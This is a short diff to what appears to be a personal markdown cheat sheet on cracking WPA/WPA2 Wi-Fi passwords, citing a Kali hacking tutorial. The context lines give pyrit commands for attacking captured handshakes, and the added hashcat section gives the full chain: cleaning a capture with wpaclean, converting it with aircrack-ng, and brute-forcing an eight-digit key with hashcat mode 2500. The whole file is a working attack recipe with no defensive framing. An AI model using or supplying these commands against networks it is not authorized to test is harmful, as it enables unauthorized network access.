@@ -21,3 +21,8 @@ http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-ka
 * #pyrit eval
 * pyrit -u sqlite:///mydb.db batch
 * pyrit -u sqlite:///mydb.db -r *.cap attack_db
+
+### hashcat
+* wpaclean out.cap mon0-01.cap
+* aircrack-ng out.cap -J out
+* hashcat -m 2500 -a 3 out.hccap '?d?d?d?d?d?d?d?d'
